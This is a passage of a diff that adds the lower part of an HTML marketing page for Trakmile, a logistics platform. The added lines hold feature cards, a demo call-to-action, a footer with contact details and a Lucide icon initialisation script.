+                    <p>Automate regular webhook notifications, invoice generations, and driver assignment workflows to save human labor hours.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="smile"></i></div>
+                    <h3>Superior Customer Experience</h3>
+                    <p>Delight end consumers with SMS tracking codes, real-time map positions, and flexible rescheduling options.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="trending-up"></i></div>
+                    <h3>Highly Scalable Architecture</h3>
+                    <p>Our microservices and cloud backends are robustly ready to ingest high payload counts during peak e-commerce seasons.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Call To Action Section -->
+    <section class="cta" id="demo">
+        <h2>Experience Trakmile Today</h2>
+        <p>Discover how modern logistics tech stacks can drastically streamline delivery ops, lower failed attempts, and scale your ROI.</p>
+        <a href="https://demo.trakmile.com" class="btn btn-cta">
+            Launch Live Demo Platform <i data-lucide="external-link"></i>
+        </a>
+    </section>
+
+    <!-- Professional Grid Footer -->
+    <footer id="contact">
+        <div class="container footer-grid">
+            <div class="footer-brand">
+                <img src="imgs/logo-big.png" alt="Trakmile">
+                <p>Next-generation, end-to-end logistics operating architecture powering smart fulfillment nodes globally.</p>
+            </div>
+            <div class="footer-links">
+                <h4>Product</h4>
+                <ul>
+                    <li><a href="#features">Features</a></li>
+                    <li><a href="#why">Why Trakmile</a></li>
+                    <li><a href="https://demo.trakmile.com">Demo Platform</a></li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <h4>Contact Support</h4>
+                <ul>
+                    <li><a href="mailto:info@trakmile.com">info@trakmile.com</a></li>
+                    <li><a href="#">Riyadh, Saudi Arabia</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="container footer-bottom">
+            <p>&copy; 2026 Trakmile. All Rights Reserved.</p>
+            <p>Built for Smarter Fulfillment Ecosystems.</p>
+        </div>
+    </footer>
+
+    <!-- Initialize Lucide Icons -->
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
